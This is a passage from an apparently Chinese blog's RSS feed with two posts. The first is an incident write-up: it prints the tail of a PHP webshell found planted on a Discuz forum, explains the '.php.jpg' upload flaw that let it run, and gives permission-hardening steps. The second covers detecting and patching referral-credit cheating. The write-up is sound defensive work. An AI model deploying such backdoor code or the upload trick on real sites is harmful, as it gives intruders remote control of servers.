<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'selected'</span>]==<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">"&lt;option value=\"$key\" selected&gt;</span><span style="color: #f0c674;">$value</span><span style="color: #8abeb7;">&lt;/option&gt;"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">"&lt;option value=\"$key\"&gt;</span><span style="color: #f0c674;">$value</span><span style="color: #8abeb7;">&lt;/option&gt;"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">"&lt;/select&gt;"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'newline'</span>]) p(<span style="color: #8abeb7;">'&lt;/p&gt;'</span>);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">formhead</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span> = <span style="color: #b5bd68;">array</span>()) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">self</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'method'</span>] &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'method'</span>] = <span style="color: #8abeb7;">'post'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'action'</span>] &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'action'</span>] = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">self</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'target'</span>] = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'target'</span>] ? <span style="color: #8abeb7;">"target=\"$arg[target]\""</span> : <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'name'</span>] &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'name'</span>] = <span style="color: #8abeb7;">'form1'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">"&lt;form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" metho</span><span style="color: #8abeb7; text-decoration: underline;">d=\"$arg[method]\" </span><span style="color: #f0c674; text-decoration: underline;">$arg</span><span style="color: #8abeb7; text-decoration: underline;">[target]&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>]) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;h2&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>].<span style="color: #8abeb7;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">maketext</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span> = <span style="color: #b5bd68;">array</span>()){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'cols'</span>] &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'cols'</span>] = 100;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'rows'</span>] &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'rows'</span>] = 25;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>] = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>] ? <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>].<span style="color: #8abeb7;">'&lt;br /&gt;'</span> : <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">"&lt;p&gt;</span><span style="color: #f0c674;">$arg</span><span style="color: #8abeb7;">[title]&lt;textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name</span><span style="color: #8abeb7; text-decoration: underline;">]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" </span><span style="color: #f0c674; text-decoration: underline;">$arg</span><span style="color: #8abeb7; text-decoration: underline;">[extra]&gt;</span><span style="color: #f0c674; text-decoration: underline;">$arg</span><span style="color: #8abeb7; text-decoration: underline;">[value]&lt;/textarea&gt;&lt;/p&gt;"</span><span style="text-decoration: underline;">);</span>
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">formfooter</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">name</span> = <span style="color: #8abeb7;">''</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">name</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">name</span> = <span style="color: #8abeb7;">'submit'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;p&gt;&lt;input class="bt" name="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">name</span>.<span style="color: #8abeb7;">'" id="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">name</span>.<span style="color: #8abeb7;">'" type="submit" value=</span><span style="color: #8abeb7; text-decoration: underline;">"Submit"&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/form&gt;'</span>);
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">goback</span>(){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">self</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;form action="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">self</span>.<span style="color: #8abeb7;">'" method="post"&gt;&lt;input type="hidden" name="action"</span><span style="color: #8abeb7; text-decoration: underline;"> value="file" /&gt;&lt;input type="hidden" name="dir" value="'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'" /&gt;&lt;p&gt;&lt;input class="bt" type="submit" value="Go back..."&gt;&lt;/p&gt;&lt;/form&gt;'</span><span style="text-decoration: underline;">);</span>
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">formfoot</span>(){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/form&gt;'</span>);
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">encode_pass</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pass</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pass</span> = md5(<span style="color: #8abeb7;">'angel'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pass</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pass</span> = md5(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pass</span>.<span style="color: #8abeb7;">'angel'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pass</span> = md5(<span style="color: #8abeb7;">'angel'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pass</span>.<span style="color: #8abeb7;">'angel'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pass</span>;
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">pr</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">s</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #8abeb7;">"&lt;pre&gt;"</span>.print_r(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">s</span>).<span style="color: #8abeb7;">'&lt;/pre&gt;'</span>;
}

<span style="color: #b294bb;">?&gt;</span>
</pre>
</div>

<p>
上面的脚本被恶意用户完成对系统的远程控制。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5">问题根源</h2>
<div class="outline-text-2" id="text-5">
<p>
这次发现的恶意代码注入应该是之前的一次 <code>nginx</code> 和 <code>php</code> <a href="http://www.oschina.net/translate/10-tips-for-securing-nginx#translate_28443">安全漏洞</a> 引起，当时由 <code>WooYun.org</code> 汇报，原来已经被恶意用户种下了这些后门。
</p>

<p>
这个漏洞简言之就是用户可以上传文件后缀为 <code>.php.jpg</code> 的文件，在外部访问时直接被当做 <code>php</code> 执行，罪魁祸首归结为以下三点：
</p>

<ul class="org-ul">
<li><code>php</code> 配置
</li>

<li><code>nginx</code> 配置
</li>

<li><code>discuz</code>

<p>
允许上传文件名指定后缀为 <code>.php.jpg</code>
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-6" class="outline-2">
<h2 id="sec-6">加固措施</h2>
<div class="outline-text-2" id="text-6">
<ul class="org-ul">
<li>采用更严格的文件目录权限

<ul class="org-ul">
<li>列出属主不应该为 <code>nobody</code> 的目录：

<div class="org-src-container">

<pre class="src src-sh">find . -type d  | xargs ls -lad | grep nobody | grep -v <span style="color: #8abeb7;">'/data'</span>
</pre>
</div>

<p>
除 <code>discuz</code> 要求为可写的目录（路径名包启/data）外，其它所有文件及目录属主都改为非 <code>nobody</code> 用户。
</p>

<p>
需要注意的是 <code>source/plugin/</code> 下的所有目录需要为所有用户添加上可执行权限（特别是自已开发并上传解压的插件），否则访问插件时会出现以下错误提示：
</p>

<pre class="example">
         指定的插件模块文件(XXXXXXXXXX)不存在或存在语法错误，请检查是否已将插件完整上传
</pre>
</li>

<li>列出属主不应该为 <code>nobody</code> 的文件：

<div class="org-src-container">

<pre class="src src-sh">find . -type f  | xargs ls -la | grep nobody | grep -v <span style="color: #8abeb7;">'/data'</span>
</pre>
</div>

<p>
除 <code>discuz</code> 要求为可写的文件（路径名包启/data）外，其它所有文件属主都改为非 <code>nobody</code> 用户。
</p>
</li>

<li>列出 <code>nobody</code> 可写的文件

<div class="org-src-container">

<pre class="src src-sh">find . -type f ! -perm 0644  | xargs ls -la | grep -v <span style="color: #8abeb7;">'/data/'</span>
</pre>
</div>

<p>
收回非必要的写权限。
</p>
</li>
</ul>
</li>

<li>确保上传目录中的 <code>php</code> 文件不会被当做 <code>php</code> 执行

<ul class="org-ul">
<li>data/attachment
</li>
<li>uc_server/data/avatar
</li>
<li>uc_server/data/tmp
</li>
</ul>
</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Discuz访问推广任务反作弊]]></title>
            <link>/article/discuz-8bbf95ee63a85e7f4efb52a153cd4f5c5f0a.html</link>
            <guid>/article/discuz-8bbf95ee63a85e7f4efb52a153cd4f5c5f0a.html</guid>
            <pubDate>Thu, 19 Dec 2013 17:02:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li>识别作弊

<p>
发贴、回复较少的用户具有偏高的积分、等级通常就是潜在的作弊对象。在后台查看该用户的积分历史，如果来历不明，那么很可能是通过访问推广作弊获得的。
</p>

<p>
在我们的例子里就发现有一个用户金钱数过高，先查看该用户的积分表：
</p>

<pre class="example">
mysql&gt; SELECT total, cyclenum, extcredits2 FROM g_common_credit_rule_log WHERE rid=8 and uid=119;
+-------+----------+-------------+
| total | cyclenum | extcredits2 |
+-------+----------+-------------+
|  3454 |     3454 |           1 |
+-------+----------+-------------+
1 row in set (0.00 sec)
</pre>

<p>
相关字段说明
</p>
<dl class="org-dl">
<dt> total </dt><dd>策略被执行总次数
</dd>
<dt> cyclenum </dt><dd>周期被执行次数 
</dd>
<dt> extcredits2 </dt><dd>我们的系统里对应金钱数
</dd>
<dt> rid </dt><dd>值8为访问推广任务类型
</dd>
<dt> uid </dt><dd>值119为作弊用户id
</dd>
</dl>
<p>
从上面可以看出该用户完成了3454次任务， 接下来就需要确认这些任务是通过作弊完成的了。
</p>

<p>
搜索该用户推广链接在web服务器中留下的访问日志：
</p>
<pre class="example">
logs# grep 'fromuid=119' /usr/local/nginx/logs/access.log*
"GET /?fromuid=119.jpg HTTP/1.1" 301 6243 "http://xxxx.org/details.php?id=178668"
...
</pre>

<p>
可以初步断定，该用户通过在其它论坛中发布信息并将推广url注入到图片的url中，这样我们的站点在访问量没有任何增长的情况下该用户的推广数却瞬间彪升了。
</p>
</li>

<li>阻止作弊

<p>
通过使用引用页中的用户标识进行记录来解决这个问题，这样只有当用户来到论坛并进行了相关操作才算推荐有效。
</p>

<p>
修改source/class/discuz/discuz_application.php文件，将下面的内容：
</p>
<div class="org-src-container">

<pre class="src src-php"><span style="color: #b5bd68;">if</span>((<span style="color: #81a2be;">!</span><span style="color: #b5bd68;">empty</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_GET</span>[<span style="color: #8abeb7;">'fromuid'</span>]) || <span style="color: #81a2be;">!</span><span style="color: #b5bd68;">empty</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_GET</span>[<span style="color: #8abeb7;">'fromuser'</span>])) &amp;&amp; (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">var</span>[<span style="color: #8abeb7;">'setti</span><span style="color: #8abeb7; text-decoration: underline;">ng'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'creditspolicy'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'promotion_visit'</span><span style="text-decoration: underline;">] || </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #81a2be; text-decoration: underline;">this</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #f0c674; text-decoration: underline;">var</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'setting'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'creditspolicy'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'promotion_register'</span><span style="text-decoration: underline;">])) {</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">require_once</span> libfile(<span style="color: #8abeb7;">'misc/promotion'</span>, <span style="color: #8abeb7;">'include'</span>);
}
</pre>
</div>
<p>
改为：
</p>
<div class="org-src-container">

<pre class="src src-php"><span style="color: #b5bd68;">if</span> (<span style="color: #b5bd68;">isset</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_REFERER'</span>]) &amp;&amp; strpos(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_REFERER'</span>], <span style="color: #8abeb7;">'http://</span><span style="color: #8abeb7; text-decoration: underline;">XXX.com/'</span><span style="text-decoration: underline;">) === 0) {</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">referer_query</span> = parse_url(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_REFERER'</span>], <span style="color: #81a2be;">PHP_URL_QUERY</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">referer_query</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   parse_str(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">referer_query</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">referer_get</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>((<span style="color: #81a2be;">!</span><span style="color: #b5bd68;">empty</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">referer_get</span>[<span style="color: #8abeb7;">'fromuid'</span>]) || <span style="color: #81a2be;">!</span><span style="color: #b5bd68;">empty</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">referer_get</span>[<span style="color: #8abeb7;">'fromuser'</span>]))<span style="text-decoration: underline;"> &amp;&amp; (</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #81a2be; text-decoration: underline;">this</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #f0c674; text-decoration: underline;">var</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'setting'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'creditspolicy'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'promotion_visit'</span><span style="text-decoration: underline;">] || </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #81a2be; text-decoration: underline;">this</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #f0c674; text-decoration: underline;">var</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'setting'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'creditspolicy'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'promotion_register'</span><span style="text-decoration: underline;">])) {</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">require_once</span> libfile(<span style="color: #8abeb7;">'misc/promotion'</span>, <span style="color: #8abeb7;">'include'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}
</pre>
</div>

<p>
修改source/include/misc/misc_promotion.php文件，将下面的内容：
</p>
<div class="org-src-container">

<pre class="src src-php"><span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span><span style="color: #b5bd68;">empty</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_GET</span>[<span style="color: #8abeb7;">'fromuid'</span>])) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fromuid</span> = intval(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_GET</span>[<span style="color: #8abeb7;">'fromuid'</span>]);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fromuser</span> = <span style="color: #8abeb7;">''</span>;
} <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fromuser</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_GET</span>[<span style="color: #8abeb7;">'fromuser'</span>];
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fromuid</span> = <span style="color: #8abeb7;">''</span>;
}
</pre>
</div>
<p>
改为：
</p>
<div class="org-src-container">

<pre class="src src-php"><span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span><span style="color: #b5bd68;">empty</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">referer_get</span>[<span style="color: #8abeb7;">'fromuid'</span>])) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fromuid</span> = intval(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">referer_get</span>[<span style="color: #8abeb7;">'fromuid'</span>]);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fromuser</span> = <span style="color: #8abeb7;">''</span>;
} <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fromuser</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">referer_get</span>[<span style="color: #8abeb7;">'fromuser'</span>];
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fromuid</span> = <span style="color: #8abeb7;">''</span>;
}
</pre>
</div>
</li>
</ul>
]]></content:encoded>
        </item>
    </channel>
</rss>